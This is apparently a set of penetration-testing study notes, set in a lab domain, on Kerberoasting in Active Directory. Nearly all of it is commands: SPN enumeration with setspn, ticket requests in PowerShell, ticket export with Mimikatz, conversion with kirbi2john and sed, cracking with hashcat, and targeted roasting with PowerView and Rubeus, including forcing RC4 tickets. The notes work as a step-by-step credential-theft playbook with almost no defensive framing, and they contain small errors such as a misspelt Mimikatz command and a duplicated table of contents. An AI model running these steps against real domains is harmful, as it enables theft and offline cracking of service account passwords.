## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
  - [Extracting Tickets from Memory with Mimikatz](#Extracting\Tickets\from\Memory\with\Mimikatz)
  - [Preparing the base64 Blob for Cracking](#Preparing\the\base64\Blob\for\Cracking)
        - [Extracting the Kerberos Ticket using kirbi2john.py](#Extracting\the\Kerberos\Ticket\using\kirbi2john.py)
      - [Modifying crack_file for Hashcat](#Modifying\crack_file\for\Hashcat)
      - [Cracking the Hash with Hashcat](#Cracking\the\Hash\with\Hashcat)
          - [Using PowerView to Target a specific Users](#Using\PowerView\to\Target\a\specific\Users)
    - [Using Rubeus.exe with the /stats flag](#Using\Rubeus.exe\with\the\/stats\flag)
        - [Using the /nowrap Flag](#Using\the\/nowrap\Flag)
          - [Requesting a New Ticket](#Requesting\a\New\Ticket)

## Table of Contents

      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
  - [Extracting Tickets from Memory with Mimikatz](#Extracting\Tickets\from\Memory\with\Mimikatz)
  - [Preparing the base64 Blob for Cracking](#Preparing\the\base64\Blob\for\Cracking)
        - [Extracting the Kerberos Ticket using kirbi2john.py](#Extracting\the\Kerberos\Ticket\using\kirbi2john.py)
      - [Modifying crack_file for Hashcat](#Modifying\crack_file\for\Hashcat)
      - [Cracking the Hash with Hashcat](#Cracking\the\Hash\with\Hashcat)
          - [Using PowerView to Target a specific Users](#Using\PowerView\to\Target\a\specific\Users)
    - [Using Rubeus.exe with the /stats flag](#Using\Rubeus.exe\with\the\/stats\flag)
        - [Using the /nowrap Flag](#Using\the\/nowrap\Flag)
          - [Requesting a New Ticket](#Requesting\a\New\Ticket)


`rubeus`: used for stealing/forging kerberos tickets

```powershell
setspn.exe -Q */*
```


```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1443"
```


#### Retrieving All Tickets Using setspn.exe

Retrieving All Tickets Using setspn.exe

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extracting Tickets from Memory with Mimikatz
```
mimikatz # base64 /out:true
---

mimikatz # kerbers::list /export

```

## Preparing the base64 Blob for Cracking
```shell
echo "<base64 blob>" |  tr -d \\n
```

##### Extracting the Kerberos Ticket using kirbi2john.py
```python
python kirbi2john.py sqldevl.kirbi
```


#### Modifying crack_file for Hashcat
```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```


#### Cracking the Hash with Hashcat
```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

#powerview
```bash
Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname
```

###### Using PowerView to Target a specific Users
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Exporting all tickets to a CSV file**
```powershell
Get-DomainUser * -spn | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#rubeus
### Using Rubeus.exe with the /stats flag
```powershell
.\Rubeus.exe kerberoast /stats
```

##### Using the /nowrap Flag
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

[This Chart](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) denotes the different encryption types

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

###### Requesting a New Ticket
```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
`/tgtdeleg` - Specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request.
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```






















































